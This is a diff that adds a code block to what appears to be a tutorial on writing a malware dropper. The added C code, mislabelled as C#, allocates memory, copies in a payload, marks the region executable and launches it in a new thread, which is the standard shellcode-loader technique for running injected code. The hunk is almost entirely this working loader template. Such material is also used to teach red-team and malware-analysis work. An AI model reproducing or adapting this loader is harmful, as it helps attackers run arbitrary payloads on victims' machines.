@@ -41,6 +41,28 @@ Lastly we make use of the ```CreateThread``` API to execute our code in a new th
 
 Our template for our dropper should now look like this:
 
+```c#
+	
+	// Reserve space in memory for our payload
+  me_reserve = VirtualAlloc(0, payload_length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+	// Move the payload to the newly reserved space.
+	RtlMoveMemory(me_reserve, payload, payload_length);
+	
+	// Change the memory protection to add execute permissions
+	mem_protect = VirtualProtect(me_reserve, payload_length, PAGE_EXECUTE_READ, &oldprotect);
+
+	// run the payload
+	if ( mem_protect != 0 ) {
+			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) me_reserve, 0, 0, 0);
+			WaitForSingleObject(th, -1);
+	}
+
+	return 0;
+}
+
+```
+
 
 
 
